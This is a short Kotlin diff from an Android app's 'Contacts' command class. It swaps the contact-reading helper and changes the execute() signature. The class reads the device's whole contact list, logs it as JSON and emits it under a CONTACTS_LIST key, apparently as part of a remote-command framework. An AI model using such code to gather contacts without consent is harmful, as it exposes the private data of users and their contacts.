@@ -4,6 +4,7 @@ import android.content.Context
 import com.google.gson.Gson
 import com.hc.calling.commands.Command
 import com.hc.calling.commands.Executor
+import com.hc.calling.commands.contact.util.ContactGainer
 import com.orhanobut.logger.Logger
 
 /**
@@ -17,8 +18,8 @@ class Contacts(context: Context) : Command(), Executor {
         this.context = context
     }
 
-    override fun execute(data: Any) {
-        val contactsList = ContactUtil.getContacts(context!!)
+    override fun execute(data: Array<Any>) {
+        val contactsList = ContactGainer.getContacts(context!!)
         val data = Gson().toJson(contactsList)
         Logger.json(data)
         emitData(CONTACTS_LIST, data)
